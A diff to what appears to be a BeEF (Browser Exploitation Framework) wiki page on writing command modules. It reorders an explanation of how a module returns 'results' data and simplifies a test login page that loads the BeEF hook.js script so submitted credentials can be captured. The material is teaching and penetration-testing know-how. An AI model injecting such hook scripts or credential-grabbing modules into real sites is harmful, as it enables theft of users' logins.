@@ -234,6 +234,15 @@ Then we send it back to beef like this:
 beef.net.send("<%= @command_url %>", <%= @command_id %>, "results="+data);
 ```
 
+The data sent back is prepended with `results` because on the receiving end, `module.rb` stores the result using "results" as a key:
+
+```rb
+content['results'] = @datastore['results']
+
+```
+
+Thus the parameter name must match that in `command.js`.
+
 
 The final command.js looks like this:
 
@@ -251,13 +260,7 @@ beef.execute(function() {
 
 ```
 
-The data sent back is prepended with `results` because on the receiving end, `module.rb` stores the result using "results" as a key:
 
-```rb
-content['results'] = @datastore['results']
-
-```
-Thus the parameter name must match that in `command.js`.
 
 ## Testing the module
 
@@ -272,9 +275,6 @@ However, for testing this module we will use a custom web page with a login fiel
 
 <script src="http://localhost:3000/hook.js" type="text/javascript"></script>
 <form action="login.html" method="post">
-  <div class="imgcontainer">
-    <img src="img_avatar2.png" alt="Avatar" class="avatar">
-  </div>
 
   <div class="container">
     <label for="uname"><b>Username</b></label>
@@ -289,10 +289,6 @@ However, for testing this module we will use a custom web page with a login fiel
     </label>
   </div>
 
-  <div class="container" style="background-color:#f1f1f1">
-    <button type="button" class="cancelbtn">Cancel</button>
-    <span class="psw">Forgot <a href="#">password?</a></span>
-  </div>
 </form>
 
 ```
@@ -300,7 +296,7 @@ However, for testing this module we will use a custom web page with a login fiel
 This HTML page contains a login form, and is hooked to the beef browser. Now fill out the username and password, then execute the new module to see the results returned.
 
 
-[[Images/test-module.png|align=center]]
+<img src="Images/test-module.png" height="140">
 
 ***
 [[Javascript API|Javascript API]] | [[Creating An Extension|Creating An Extension]]
